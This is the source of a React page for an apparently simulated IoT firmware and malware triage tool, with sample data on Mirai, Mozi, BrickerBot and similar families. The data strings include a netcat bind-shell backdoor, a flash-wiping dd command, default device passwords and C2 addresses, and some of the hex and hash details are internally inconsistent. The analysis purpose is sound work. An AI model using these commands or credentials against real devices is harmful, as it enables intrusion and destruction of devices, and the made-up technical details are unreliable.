"use client";

import { useState } from "react";
import Link from "next/link";
import {
  Box,
  Cpu,
  Terminal,
  FolderTree,
  FileCode,
  ShieldAlert,
  Radio,
  Play,
  RotateCcw,
  StepForward,
  Eye,
  Key,
  Database,
  Lock,
  Unlock,
  AlertTriangle,
  CheckCircle,
  Copy,
  Download,
  Search,
  Zap,
  Layers,
  Network,
  RefreshCw,
  Sliders,
  Crosshair,
  Server,
  Code
} from "lucide-react";
import { MALWARE_SAMPLES } from "@/data/samples";

// Multi-Architecture Sample Data
interface IotSample {
  id: string;
  name: string;
  targetDevice: string;
  arch: "ARM32" | "AArch64" | "MIPS (mipseb)" | "MIPS (mipsel)" | "RISC-V (RV64)" | "PowerPC (PPC32)";
  archType: "ARM" | "MIPS" | "RISCV" | "PPC";
  endianness: "Big Endian" | "Little Endian";
  fileFormat: "ELF 32-bit LSB" | "ELF 32-bit MSB" | "ELF 64-bit LSB" | "SquashFS v4.0" | "CramFS v2.0" | "JFFS2 Image";
  fileSize: string;
  entropy: number;
  family: "Mirai" | "Mozi" | "BrickerBot" | "Gafgyt/Bashlite" | "RedGoat" | "Firmware Backdoor";
  botnetType: string;
  xorKey?: string;
  c2Nodes: string[];
  watchdogTarget: string[];
  summary: string;
}

const IOT_SAMPLES: IotSample[] = [
  {
    id: "IOT-001",
    name: "mirai.arm32.elf",
    targetDevice: "Hikvision IP Cameras & Realtek Routers",
    arch: "ARM32",
    archType: "ARM",
    endianness: "Little Endian",
    fileFormat: "ELF 32-bit LSB",
    fileSize: "68.4 KB",
    entropy: 6.24,
    family: "Mirai",
    botnetType: "SYN/ACK Scanner & Telnet Propagator",
    xorKey: "0xDEADBEEF (4-byte XOR table)",
    c2Nodes: ["185.220.101.5:48101", "cnc.dark-iot-bot.net:2323"],
    watchdogTarget: ["/dev/watchdog", "/dev/misc/watchdog", "/dev/wdt"],
    summary: "Mirai ARM32 binary targeting Cortex-A7/A9 embedded Linux kernels. Unmasks obfuscated C2 domains using XOR key 0xDEADBEEF, scans port 23/2323 with SYN probing, and disables hardware watchdog timers to prevent device self-reboot during DDoS storms."
  },
  {
    id: "IOT-002",
    name: "mozi.mipseb.bin",
    targetDevice: "Netgear DGN & Huawei Home Gateways",
    arch: "MIPS (mipseb)",
    archType: "MIPS",
    endianness: "Big Endian",
    fileFormat: "ELF 32-bit MSB",
    fileSize: "142.1 KB",
    entropy: 7.15,
    family: "Mozi",
    botnetType: "P2P Kademlia DHT Botnet",
    xorKey: "0x22 (Single-byte rolling key)",
    c2Nodes: ["dht.transmissionbt.com:6881", "101.99.18.42:8088", "114.119.160.20:4432"],
    watchdogTarget: ["/dev/watchdog0", "/proc/sys/kernel/watchdog"],
    summary: "Mozi MIPS Big-Endian payload utilizing Kademlia Distributed Hash Table (DHT) for decentralized peer routing. Authenticates remote config payloads using hardcoded ECDSA public keys and actively hunts and kills rival bots (Gafgyt, Hajime)."
  },
  {
    id: "IOT-003",
    name: "brickerbot.mipsel.elf",
    targetDevice: "OpenWrt / DD-WRT Ubiquiti Transceivers",
    arch: "MIPS (mipsel)",
    archType: "MIPS",
    endianness: "Little Endian",
    fileFormat: "ELF 32-bit LSB",
    fileSize: "54.8 KB",
    entropy: 5.82,
    family: "BrickerBot",
    botnetType: "Permanent Denial of Service (PDoS) / Flash Corrupter",
    xorKey: "None (Plaintext shell scripts embedded)",
    c2Nodes: ["Autonomous PDoS - No central C2"],
    watchdogTarget: ["/dev/watchdog (Enables timeout=1s to force brick)"],
    summary: "Aggressive PDoS malware targeting MIPS Little-Endian routers. Rewrites NAND flash partitions with zeros via dd if=/dev/urandom of=/dev/mtd0, flushes iptables, disables network interfaces, and triggers kernel panic."
  },
  {
    id: "IOT-004",
    name: "gafgyt.ppc32.elf",
    targetDevice: "Cisco & Mikrotik PowerPC Routers (MPC85xx)",
    arch: "PowerPC (PPC32)",
    archType: "PPC",
    endianness: "Big Endian",
    fileFormat: "ELF 32-bit MSB",
    fileSize: "89.0 KB",
    entropy: 6.45,
    family: "Gafgyt/Bashlite",
    botnetType: "IRC / TCP Command Dispatch Bot",
    xorKey: "0x5A (Static XOR)",
    c2Nodes: ["194.26.29.112:6667 (IRC Channel #gafgyt)"],
    watchdogTarget: ["/dev/watchdog"],
    summary: "Gafgyt (Bashlite) variant cross-compiled for 32-bit PowerPC architecture. Connects to an encrypted IRC C2 channel, executes multi-vector HTTP flood commands, and exploits CVE-2017-17215 for UPnP propagation."
  },
  {
    id: "IOT-005",
    name: "redgoat.rv64gc.bin",
    targetDevice: "Next-Gen RISC-V Industrial IoT Gateways (SiFive FU740)",
    arch: "RISC-V (RV64)",
    archType: "RISCV",
    endianness: "Little Endian",
    fileFormat: "ELF 64-bit LSB",
    fileSize: "118.5 KB",
    entropy: 6.88,
    family: "RedGoat",
    botnetType: "Modbus/SCADA ICS Protocol Hijacker",
    xorKey: "ChaCha20 Keystream (Hardcoded IV)",
    c2Nodes: ["45.154.255.89:5020", "scada-c2.darkfleet.ru:8443"],
    watchdogTarget: ["/dev/industrial_wdt"],
    summary: "Novel RISC-V 64-bit malware targeting modern Industrial IoT controllers. Implements Modbus TCP function code injection (FC05/FC15) to trip emergency shutdown valves while maintaining covert reverse SSH tunnel."
  },
  {
    id: "IOT-006",
    name: "hikvision_backdoor.squashfs",
    targetDevice: "Hikvision IP Video Recorders (Firmware v5.4.5)",
    arch: "ARM32",
    archType: "ARM",
    endianness: "Little Endian",
    fileFormat: "SquashFS v4.0",
    fileSize: "14.2 MB",
    entropy: 5.92,
    family: "Firmware Backdoor",
    botnetType: "Hardcoded Remote SSH/Telnet Backdoor & NVRAM Exfiltrator",
    c2Nodes: ["Passive Listening on Port 2323 / 9999"],
    watchdogTarget: ["/etc/init.d/watchdog.sh"],
    summary: "Complete SquashFS root filesystem image extracted from compromised IP cameras. Contains hidden hardcoded administrative credentials in /etc/shadow, an undocumented debug service in /bin/hikdebug, and cloud telemetry exfiltration."
  }
];

// Disassembly Instructions per Architecture
const ARCH_DISASSEMBLY: Record<string, { offset: string; hex: string; opcode: string; args: string; comment: string }[]> = {
  "ARM32": [
    { offset: "0x00010480", hex: "e92d4800", opcode: "push", args: "{r11, lr}", comment: "Prolog: save frame pointer and return address" },
    { offset: "0x00010484", hex: "e28db004", opcode: "add", args: "r11, sp, #4", comment: "Setup frame pointer" },
    { offset: "0x00010488", hex: "e24dd020", opcode: "sub", args: "sp, sp, #32", comment: "Allocate 32 bytes stack frame" },
    { offset: "0x0001048c", hex: "e59f0044", opcode: "ldr", args: "r0, [pc, #68]", comment: "Load ptr to XOR encrypted C2 string (/dev/watchdog)" },
    { offset: "0x00010490", hex: "e3a010de", opcode: "mov", args: "r1, #0xde", comment: "r1 = XOR key 0xDEADBEEF byte 0" },
    { offset: "0x00010494", hex: "eb000112", opcode: "bl", args: "0x000108e4 <table_unlock>", comment: "Call Mirai string decryptor routine" },
    { offset: "0x00010498", hex: "e3a01002", opcode: "mov", args: "r1, #2", comment: "r1 = O_RDWR (2)" },
    { offset: "0x0001049c", hex: "eb0001f0", opcode: "bl", args: "0x00010c64 <open>", comment: "open('/dev/watchdog', O_RDWR)" },
    { offset: "0x000104a0", hex: "e2504000", opcode: "subs", args: "r4, r0, #0", comment: "Check if fd > 0" },
    { offset: "0x000104a4", hex: "5a000004", opcode: "bpl", args: "0x000104bc <wdt_disable>", comment: "Branch if watchdog device opened successfully" },
    { offset: "0x000104a8", hex: "e3a00002", opcode: "mov", args: "r0, #2", comment: "AF_INET (2)" },
    { offset: "0x000104ac", hex: "e3a01001", opcode: "mov", args: "r1, #1", comment: "SOCK_STREAM (1)" },
    { offset: "0x000104b0", hex: "e3a02006", opcode: "mov", args: "r2, #6", comment: "IPPROTO_TCP (6)" },
    { offset: "0x000104b4", hex: "eb000210", opcode: "bl", args: "0x00010cfc <socket>", comment: "Create outbound scanner TCP socket" },
    { offset: "0x000104b8", hex: "e1a05000", opcode: "mov", args: "r5, r0", comment: "Store socket fd in r5" },
    { offset: "0x000104bc", hex: "e1a00004", opcode: "mov", args: "r0, r4", comment: "wdt_disable: r0 = fd" },
    { offset: "0x000104c0", hex: "e59f101c", opcode: "ldr", args: "r1, [pc, #28]", comment: "r1 = WDIOC_SETOPTIONS (0x5704)" },
    { offset: "0x000104c4", hex: "e59f201c", opcode: "ldr", args: "r2, [pc, #28]", comment: "r2 = WDIOS_DISABLECARD (0x0001)" },
    { offset: "0x000104c8", hex: "eb000234", opcode: "bl", args: "0x00010da0 <ioctl>", comment: "ioctl(fd, WDIOC_SETOPTIONS, &disable)" }
  ],
  "MIPS (mipseb)": [
    { offset: "0x00401120", hex: "27bdffe0", opcode: "addiu", args: "$sp, $sp, -32", comment: "Prolog: allocate 32 bytes on MIPS stack" },
    { offset: "0x00401124", hex: "afbf001c", opcode: "sw", args: "$ra, 28($sp)", comment: "Save return address $ra" },
    { offset: "0x00401128", hex: "afs00018", opcode: "sw", args: "$s0, 24($sp)", comment: "Save callee-saved register $s0" },
    { offset: "0x0040112c", hex: "3c040042", opcode: "lui", args: "$a0, 0x42", comment: "Load high 16 bits of DHT Node ID buffer" },
    { offset: "0x00401130", hex: "248430a0", opcode: "addiu", args: "$a0, $a0, 0x30a0", comment: "Load low 16 bits: $a0 = &mozi_dht_id" },
    { offset: "0x00401134", hex: "0c100450", opcode: "jal", args: "0x00401450 <kademlia_init>", comment: "Jump and Link to DHT routing table init" },
    { offset: "0x00401138", hex: "00000000", opcode: "nop", args: "", comment: "MIPS branch delay slot" },
    { offset: "0x0040113c", hex: "24040002", opcode: "li", args: "$a0, 2", comment: "$a0 = AF_INET (2)" },
    { offset: "0x00401140", hex: "24050002", opcode: "li", args: "$a1, 2", comment: "$a1 = SOCK_DGRAM (2 - UDP for DHT)" },
    { offset: "0x00401144", hex: "24060011", opcode: "li", args: "$a2, 17", comment: "$a2 = IPPROTO_UDP (17)" },
    { offset: "0x00401148", hex: "0c1005a0", opcode: "jal", args: "0x00401680 <socket>", comment: "Create UDP socket for P2P communication" },
    { offset: "0x0040114c", hex: "00000000", opcode: "nop", args: "", comment: "MIPS branch delay slot" },
    { offset: "0x00401150", hex: "00408025", opcode: "move", args: "$s0, $v0", comment: "$s0 = socket fd" },
    { offset: "0x00401154", hex: "3c040042", opcode: "lui", args: "$a0, 0x42", comment: "Load ECDSA public key address" },
    { offset: "0x00401158", hex: "0c100720", opcode: "jal", args: "0x00401c80 <verify_ecdsa>", comment: "Verify Mozi bot config signature" },
    { offset: "0x0040115c", hex: "00000000", opcode: "nop", args: "", comment: "MIPS branch delay slot" }
  ],
  "MIPS (mipsel)": [
    { offset: "0x00400810", hex: "e0ffbd27", opcode: "addiu", args: "$sp, $sp, -32", comment: "Prolog (Little Endian: bytes reversed in memory)" },
    { offset: "0x00400814", hex: "1c00bfa7", opcode: "sw", args: "$ra, 28($sp)", comment: "Save $ra on stack" },
    { offset: "0x00400818", hex: "3c040041", opcode: "lui", args: "$a0, 0x41", comment: "Load string: '/dev/mtd0' (NAND Flash device)" },
    { offset: "0x0040081c", hex: "24841020", opcode: "addiu", args: "$a0, $a0, 0x1020", comment: "$a0 points to '/dev/mtd0'" },
    { offset: "0x00400820", hex: "24050001", opcode: "li", args: "$a1, 1", comment: "$a1 = O_WRONLY (1)" },
    { offset: "0x00400824", hex: "0c100340", opcode: "jal", args: "0x00400d00 <open>", comment: "open('/dev/mtd0', O_WRONLY)" },
    { offset: "0x00400828", hex: "00000000", opcode: "nop", args: "", comment: "Delay slot" },
    { offset: "0x0040082c", hex: "00408021", opcode: "move", args: "$s0, $v0", comment: "Store MTD fd in $s0" },
    { offset: "0x00400830", hex: "00102021", opcode: "move", args: "$a0, $s0", comment: "arg0 = fd" },
    { offset: "0x00400834", hex: "3c050041", opcode: "lui", args: "$a1, 0x41", comment: "arg1 = &zeros_buffer" },
    { offset: "0x00400838", hex: "24064000", opcode: "li", args: "$a2, 16384", comment: "arg2 = 16KB write block" },
    { offset: "0x0040083c", hex: "0c100380", opcode: "jal", args: "0x00400e00 <write>", comment: "Zero out flash memory to brick device" },
    { offset: "0x00400840", hex: "00000000", opcode: "nop", args: "", comment: "Delay slot" }
  ],
  "PowerPC (PPC32)": [
    { offset: "0x10000450", hex: "9421ffe0", opcode: "stwu", args: "r1, -32(r1)", comment: "Store word and update stack pointer (PPC prolog)" },
    { offset: "0x10000454", hex: "7c0802a6", opcode: "mflr", args: "r0", comment: "Move From Link Register to r0" },
    { offset: "0x10000458", hex: "90010024", opcode: "stw", args: "r0, 36(r1)", comment: "Save LR at 36(r1)" },
    { offset: "0x1000045c", hex: "3c601001", opcode: "lis", args: "r3, 0x1001", comment: "Load immediate shifted (high 16 bits of IRC command)" },
    { offset: "0x10000460", hex: "38630140", opcode: "addi", args: "r3, r3, 0x140", comment: "r3 = 'NICK gafgyt_ppc32\\r\\nUSER bot 0 * :bot'" },
    { offset: "0x10000464", hex: "480004a1", opcode: "bl", args: "0x10000904 <irc_send>", comment: "Branch with link to IRC dispatch function" },
    { offset: "0x10000468", hex: "38800001", opcode: "li", args: "r4, 1", comment: "r4 = SIG_IGN (1)" },
    { offset: "0x1000046c", hex: "3860000d", opcode: "li", args: "r3, 13", comment: "r3 = SIGPIPE (13)" },
    { offset: "0x10000470", hex: "48000521", opcode: "bl", args: "0x10000990 <signal>", comment: "signal(SIGPIPE, SIG_IGN)" }
  ],
  "RISC-V (RV64)": [
    { offset: "0x000101b0", hex: "1101", opcode: "addi", args: "sp, sp, -32", comment: "RV64 Compressed: allocate 32 bytes stack" },
    { offset: "0x000101b2", hex: "e422", opcode: "sd", args: "s0, 8(sp)", comment: "Save s0 frame pointer" },
    { offset: "0x000101b4", hex: "e026", opcode: "sd", args: "ra, 24(sp)", comment: "Save return address ra" },
    { offset: "0x000101b6", hex: "0000", opcode: "addi", args: "s0, sp, 32", comment: "Set frame pointer" },
    { offset: "0x000101b8", hex: "00002517", opcode: "auipc", args: "a0, 0x2", comment: "PC-relative address for Modbus C2 IP" },
    { offset: "0x000101bc", hex: "e4850513", opcode: "addi", args: "a0, a0, -440", comment: "a0 = '45.154.255.89:5020'" },
    { offset: "0x000101c0", hex: "00000593", opcode: "li", args: "a1, 502", comment: "a1 = 502 (Modbus TCP standard port)" },
    { offset: "0x000101c4", hex: "0c4000ef", opcode: "jal", args: "ra, 0x00010a80 <modbus_connect>", comment: "Connect to SCADA ICS gateway" },
    { offset: "0x000101c8", hex: "00500793", opcode: "li", args: "a5, 5", comment: "a5 = Function Code 0x05 (Write Single Coil)" },
    { offset: "0x000101cc", hex: "0ff00713", opcode: "li", args: "a4, 0xff00", comment: "a4 = 0xFF00 (Force Coil ON - Emergency Vent)" }
  ]
};

// Filesystem Tree Data for SquashFS / CramFS Dissectors
interface FsNode {
  name: string;
  type: "dir" | "file" | "symlink" | "device";
  path: string;
  size?: string;
  permissions: string;
  owner: string;
  risk?: "Critical" | "High" | "Medium" | "Clean";
  content?: string;
  children?: FsNode[];
}

const FIRMWARE_ROOTFS: FsNode = {
  name: "squashfs-root",
  type: "dir",
  path: "/",
  permissions: "drwxr-xr-x",
  owner: "root:root",
  children: [
    {
      name: "bin",
      type: "dir",
      path: "/bin",
      permissions: "drwxr-xr-x",
      owner: "root:root",
      children: [
        { name: "busybox", type: "file", path: "/bin/busybox", size: "382 KB", permissions: "-rwxr-xr-x", owner: "root:root", risk: "Clean" },
        { name: "sh", type: "symlink", path: "/bin/sh", permissions: "lrwxrwxrwx", owner: "root:root", content: "-> /bin/busybox" },
        { name: "hikdebug", type: "file", path: "/bin/hikdebug", size: "48.2 KB", permissions: "-rwsr-xr-x", owner: "root:root", risk: "Critical", content: `#!/bin/sh\n# Undocumented Factory Test Backdoor Listener\n/bin/busybox nc -l -p 9999 -e /bin/sh &\n/bin/busybox telnetd -p 2323 -l /bin/sh &` },
        { name: "nvram", type: "file", path: "/bin/nvram", size: "18.4 KB", permissions: "-r-xr-xr-x", owner: "root:root", risk: "Clean" }
      ]
    },
    {
      name: "etc",
      type: "dir",
      path: "/etc",
      permissions: "drwxr-xr-x",
      owner: "root:root",
      children: [
        {
          name: "passwd",
          type: "file",
          path: "/etc/passwd",
          size: "420 B",
          permissions: "-rw-r--r--",
          owner: "root:root",
          risk: "High",
          content: `root:x:0:0:Administrator:/root:/bin/sh\nadmin:x:1000:1000:WebAdmin:/home/admin:/bin/sh\nguest:x:1001:1001:Guest:/home/guest:/bin/false\nsupport:x:1002:1002:VendorSupport:/tmp:/bin/sh\ntr069:x:1003:1003:CWMP Management:/tmp:/bin/sh`
        },
        {
          name: "shadow",
          type: "file",
          path: "/etc/shadow",
          size: "612 B",
          permissions: "-rw-------",
          owner: "root:root",
          risk: "Critical",
          content: `root:$1$xc3511$Zq2/6n53N1qKzF.vVvWz/0:18200:0:99999:7:::\nadmin:$1$juantech$O.oF31wG0aUu3E2W4R5zK.:18200:0:99999:7:::\nsupport:$1$hikvision$E4k12d.8pM19283k10294.:18200:0:99999:7:::\ntr069:$1$default$T7jMko0admin123456789.:18200:0:99999:7:::`
        },
        {
          name: "shadow.orig",
          type: "file",
          path: "/etc/shadow.orig",
          size: "580 B",
          permissions: "-rw-r--r--",
          owner: "root:root",
          risk: "Critical",
          content: `root:xc3511:18200:0:99999:7:::\nadmin:admin1234:18200:0:99999:7:::`
        },
        {
          name: "inittab",
          type: "file",
          path: "/etc/inittab",
          size: "180 B",
          permissions: "-rw-r--r--",
          owner: "root:root",
          risk: "Medium",
          content: `::sysinit:/etc/init.d/rcS\n::respawn:/bin/busybox telnetd -F -p 23\n::respawn:/bin/hikdebug\n::restart:/sbin/init`
        },
        {
          name: "nvram.default",
          type: "file",
          path: "/etc/nvram.default",
          size: "2.1 KB",
          permissions: "-rw-r--r--",
          owner: "root:root",
          risk: "High",
          content: `http_username=admin\nhttp_passwd=admin\nwan_pppoe_user=telecom_isp\nwan_pppoe_pass=isp_secret_2026\ntr069_acs_url=http://cwmp.isp-backdoor.net:7547/acs\ntelnet_enable=1\nremote_debug_port=9999\nwlan0_wpa_psk=hikvision_camera_default_key\nwdt_enable=0`
        }
      ]
    },
    {
      name: "dev",
      type: "dir",
      path: "/dev",
      permissions: "drwxr-xr-x",
      owner: "root:root",
      children: [
        { name: "watchdog", type: "device", path: "/dev/watchdog", permissions: "crw-rw----", owner: "root:root", risk: "Medium" },
        { name: "mtd0", type: "device", path: "/dev/mtd0", permissions: "brw-------", owner: "root:root", risk: "High" },
        { name: "mtd1", type: "device", path: "/dev/mtd1", permissions: "brw-------", owner: "root:root", risk: "High" },
        { name: "urandom", type: "device", path: "/dev/urandom", permissions: "crw-rw-rw-", owner: "root:root", risk: "Clean" }
      ]
    },
    {
      name: "var",
      type: "dir",
      path: "/var",
      permissions: "drwxr-xr-x",
      owner: "root:root",
      children: [
        { name: "run", type: "dir", path: "/var/run", permissions: "drwxr-xr-x", owner: "root:root" },
        { name: "tmp", type: "dir", path: "/var/tmp", permissions: "drwxrwxrwx", owner: "root:root" }
      ]
    }
  ]
};

// Hardcoded Password Cracking Data
const SHADOW_CRACKED_DATA = [
  { account: "root", salt: "xc3511", hash: "$1$xc3511$Zq2/6n53N1qKzF.vVvWz/0", algorithm: "MD5-Crypt ($1$)", crackedPassword: "admin", risk: "Critical", hardwareMatch: "Realtek / Xiongmai IP Cam default" },
  { account: "admin", salt: "juantech", hash: "$1$juantech$O.oF31wG0aUu3E2W4R5zK.", algorithm: "MD5-Crypt ($1$)", crackedPassword: "juantech_master", risk: "Critical", hardwareMatch: "Juan Vision NVR default firmware" },
  { account: "support", salt: "hikvision", hash: "$1$hikvision$E4k12d.8pM19283k10294.", algorithm: "MD5-Crypt ($1$)", crackedPassword: "7ujMko0admin", risk: "Critical", hardwareMatch: "Hikvision backdoor password (CVE-2017-7921)" },
  { account: "tr069", salt: "default", hash: "$1$default$T7jMko0admin123456789.", algorithm: "MD5-Crypt ($1$)", crackedPassword: "acs_remote_mgmt_99", risk: "High", hardwareMatch: "ISP CWMP TR-069 auto-provisioning backdoor" }
];

export default function FirmwareIotPage() {
  const [selectedSample, setSelectedSample] = useState<IotSample>(IOT_SAMPLES[0]);
  const [activeTab, setActiveTab] = useState<"DISASM" | "ROOTFS" | "BOTNET" | "QEMU">("DISASM");
  
  // Disassembly & Emulation state
  const [selectedArch, setSelectedArch] = useState<string>("ARM32");
  const [endiannessMode, setEndiannessMode] = useState<"Big Endian" | "Little Endian">("Little Endian");
  const [currentInstructionIdx, setCurrentInstructionIdx] = useState<number>(0);
  const [registers, setRegisters] = useState<Record<string, string>>({
    R0: "0x00000000",
    R1: "0x00000000",
    R2: "0x00000000",
    R3: "0x00000000",
    R4: "0x00000000",
    R5: "0x00000000",
    SP: "0x7EFFF820",
    LR: "0x00010484",
    PC: "0x00010480",
    CPSR: "0x60000010"
  });

  // Rootfs state
  const [selectedNode, setSelectedNode] = useState<FsNode | null>(FIRMWARE_ROOTFS.children![1].children![1]); // /etc/shadow
  const [crackedHashes, setCrackedHashes] = useState<boolean>(false);
  const [crackingProgress, setCrackingProgress] = useState<number>(0);

  // Mirai & Mozi state
  const [xorKeyInput, setXorKeyInput] = useState<string>("0xDEADBEEF");
  const [deobfuscatedStrings, setDeobfuscatedStrings] = useState<boolean>(true);
  const [qemuTerminalLogs, setQemuTerminalLogs] = useState<string[]>([
    "[CERBERUS-RE QEMU Embedded Sandbox v9.2.0]",
    "[*] Target Architecture: ARMv7-A (Cortex-A7 32-bit)",
    "[*] Emulating system call layer: Linux 3.10.14-hi3518-hikvision",
    "[*] Virtual MTD Flash: /dev/mtd0 mounted (4096 KB)",
    "[+] Executing: /squashfs-root/bin/mirai.arm32.elf",
    "[DEBUG] mirai: main() entrypoint hit at 0x00010480",
    "[DEBUG] mirai: initializing table_unlock() with key 0xDEADBEEF...",
    "[+] Decrypted string: '/dev/watchdog' -> IOCTL WDIOS_DISABLECARD (Watchdog disabled)",
    "[+] Decrypted string: '185.220.101.5:48101' -> Initiating TCP C2 handshake",
    "[+] Mirai Killer Thread: scanning /proc for rival bots (Gafgyt, Hajime, Qbot)...",
    "[!] Found rival listener on port 2323 -> sending SIGKILL to PID 412 (telnetd)",
    "[+] Autonomous Telnet SYN Scanner thread spawned on subnets 192.168.1.0/24..."
  ]);

  // Synchronize sample selection
  const handleSampleChange = (sampleId: string) => {
    const s = IOT_SAMPLES.find(x => x.id === sampleId);
    if (s) {
      setSelectedSample(s);
      setSelectedArch(s.arch);
      setEndiannessMode(s.endianness);
      setCurrentInstructionIdx(0);
    }
  };

  // Step emulator
  const stepEmulator = () => {
    const disasmList = ARCH_DISASSEMBLY[selectedArch] || ARCH_DISASSEMBLY["ARM32"];
    const nextIdx = (currentInstructionIdx + 1) % disasmList.length;
    setCurrentInstructionIdx(nextIdx);
    const curr = disasmList[nextIdx];

    // Mock register updates based on opcode
    setRegisters(prev => {
      const updated = { ...prev };
      updated["PC"] = curr.offset;
      if (curr.opcode === "mov" || curr.opcode === "li") {
        const dest = curr.args.split(",")[0].trim().toUpperCase();
        updated[dest] = "0x00000002";
      } else if (curr.opcode === "ldr" || curr.opcode === "lui") {
        const dest = curr.args.split(",")[0].trim().toUpperCase();
        updated[dest] = "0x004230A0";
      } else if (curr.opcode === "sub" || curr.opcode === "addiu") {
        updated["SP"] = "0x7EFFF800";
      }
      return updated;
    });
  };

  // Reset emulator
  const resetEmulator = () => {
    setCurrentInstructionIdx(0);
    setRegisters({
      R0: "0x00000000",
      R1: "0x00000000",
      R2: "0x00000000",
      R3: "0x00000000",
      R4: "0x00000000",
      R5: "0x00000000",
      SP: "0x7EFFF820",
      LR: "0x00010484",
      PC: ARCH_DISASSEMBLY[selectedArch]?.[0]?.offset || "0x00010480",
      CPSR: "0x60000010"
    });
  };

  // Hash cracking animation
  const triggerHashCracker = () => {
    setCrackingProgress(10);
    const interval = setInterval(() => {
      setCrackingProgress(p => {
        if (p >= 100) {
          clearInterval(interval);
          setCrackedHashes(true);
          return 100;
        }
        return p + 25;
      });
    }, 150);
  };

  const currentDisasm = ARCH_DISASSEMBLY[selectedArch] || ARCH_DISASSEMBLY["ARM32"];

  return (
    <div style={{ padding: "20px 24px", display: "flex", flexDirection: "column", gap: 20 }}>
      {/* Top Banner Header */}
      <div
        style={{
          background: "linear-gradient(135deg, rgba(6,182,212,0.12) 0%, rgba(14,20,34,0.98) 100%)",
          border: "1px solid rgba(6,182,212,0.3)",
          borderRadius: 10,
          padding: "18px 24px",
          display: "flex",
          alignItems: "center",
          justifyContent: "space-between",
          flexWrap: "wrap",
          gap: 16
        }}
      >
        <div>
          <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 4 }}>
            <span
              style={{
                fontSize: 10,
                fontWeight: 800,
                background: "rgba(6,182,212,0.2)",
                color: "#06b6d4",
                padding: "2px 8px",
                borderRadius: 4,
                fontFamily: "monospace"
              }}
            >
              STAGE 6.1: EMBEDDED FIRMWARE &amp; MULTI-ARCH
            </span>
            <span style={{ fontSize: 10, color: "var(--muted)" }}>QEMU / GHIDRA SLEIGH MULTI-ARCH ENGINE</span>
            <span className="badge-critical">MIRAI / MOZI / BACKDOOR TRIAGER</span>
          </div>
          <h1 style={{ fontSize: 22, fontWeight: 900, color: "#f1f5f9", letterSpacing: "-0.02em" }}>
            IoT, Embedded Firmware &amp; Multi-Architecture Triager
          </h1>
          <p style={{ fontSize: 12, color: "var(--fg-2)", marginTop: 4, maxWidth: 840 }}>
            Triages non-x86 embedded binaries across ARM32/AArch64, MIPS (EB/EL), RISC-V (RV64GC), and PowerPC. Dissects SquashFS/CramFS rootfs images, extracts hardcoded telnet backdoors, cracks <code style={{ color: "#06b6d4" }}>/etc/shadow</code> hashes, and analyzes Mirai/Mozi C2 protocols and hardware watchdog disabling loops.
          </p>
        </div>

        {/* Sample Selector */}
        <div style={{ display: "flex", flexDirection: "column", gap: 6, minWidth: 280 }}>
          <label style={{ fontSize: 10.5, fontWeight: 700, color: "var(--muted)", textTransform: "uppercase" }}>
            Select Firmware / IoT Sample:
          </label>
          <select
            className="tool-select"
            value={selectedSample.id}
            onChange={(e) => handleSampleChange(e.target.value)}
            style={{ width: "100%", background: "var(--surface-2)", borderColor: "rgba(6,182,212,0.4)" }}
          >
            {IOT_SAMPLES.map(s => (
              <option key={s.id} value={s.id}>
                {s.name} ({s.arch} - {s.family})
              </option>
            ))}
          </select>
        </div>
      </div>

      {/* Telemetry Metric Cards */}
      <div style={{
        display: "grid",
        gridTemplateColumns: "repeat(auto-fit, minmax(200px, 1fr))",
        gap: 12
      }}>
        <div style={{ background: "var(--surface)", border: "1px solid var(--border)", borderRadius: 8, padding: "12px 16px" }}>
          <div style={{ fontSize: 10, color: "var(--muted)", textTransform: "uppercase", fontWeight: 700 }}>Target Architecture</div>
          <div style={{ fontSize: 15, fontWeight: 900, color: "#38bdf8", marginTop: 4, display: "flex", alignItems: "center", gap: 6 }}>
            <Cpu size={16} />
            {selectedSample.arch}
          </div>
          <div style={{ fontSize: 10, color: "var(--muted)", marginTop: 2 }}>{selectedSample.fileFormat}</div>
        </div>

        <div style={{ background: "var(--surface)", border: "1px solid var(--border)", borderRadius: 8, padding: "12px 16px" }}>
          <div style={{ fontSize: 10, color: "var(--muted)", textTransform: "uppercase", fontWeight: 700 }}>Endianness &amp; Calling Conv</div>
          <div style={{ fontSize: 15, fontWeight: 900, color: selectedSample.endianness === "Big Endian" ? "#f59e0b" : "#10b981", marginTop: 4 }}>
            {selectedSample.endianness}
          </div>
          <div style={{ fontSize: 10, color: "var(--muted)", marginTop: 2 }}>
            {selectedSample.archType === "MIPS" ? "O32 / N64 ABI" : selectedSample.archType === "ARM" ? "AAPCS / ARM EABI" : selectedSample.archType === "RISCV" ? "LP64D ABI" : "System V PPC32"}
          </div>
        </div>

        <div style={{ background: "var(--surface)", border: "1px solid var(--border)", borderRadius: 8, padding: "12px 16px" }}>
          <div style={{ fontSize: 10, color: "var(--muted)", textTransform: "uppercase", fontWeight: 700 }}>Entropy &amp; Obfuscation</div>
          <div style={{ fontSize: 15, fontWeight: 900, color: selectedSample.entropy > 7.0 ? "#ef4444" : "#10b981", marginTop: 4 }}>
            {selectedSample.entropy.toFixed(2)} / 8.00
          </div>
          <div style={{ fontSize: 10, color: "var(--muted)", marginTop: 2 }}>
            {selectedSample.xorKey ? selectedSample.xorKey : "Unpacked ELF Section"}
          </div>
        </div>

        <div style={{ background: "var(--surface)", border: "1px solid var(--border)", borderRadius: 8, padding: "12px 16px" }}>
          <div style={{ fontSize: 10, color: "var(--muted)", textTransform: "uppercase", fontWeight: 700 }}>Watchdog Killer Status</div>
          <div style={{ fontSize: 14, fontWeight: 900, color: "#ef4444", marginTop: 4, display: "flex", alignItems: "center", gap: 6 }}>
            <AlertTriangle size={15} />
            WDT IOCTL Armed
          </div>
          <div style={{ fontSize: 10, color: "var(--muted)", marginTop: 2 }}>
            {selectedSample.watchdogTarget.join(", ")}
          </div>
        </div>

        <div style={{ background: "var(--surface)", border: "1px solid var(--border)", borderRadius: 8, padding: "12px 16px" }}>
          <div style={{ fontSize: 10, color: "var(--muted)", textTransform: "uppercase", fontWeight: 700 }}>Target Vulnerable Device</div>
          <div style={{ fontSize: 12, fontWeight: 800, color: "#f1f5f9", marginTop: 4, whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis" }}>
            {selectedSample.targetDevice}
          </div>
          <div style={{ fontSize: 10, color: "#06b6d4", marginTop: 2 }}>Family: {selectedSample.family}</div>
        </div>
      </div>

      {/* Main Studio Navigation Tabs */}
      <div style={{ display: "flex", gap: 8, borderBottom: "1px solid var(--border)", paddingBottom: 8, overflowX: "auto" }}>
        {[
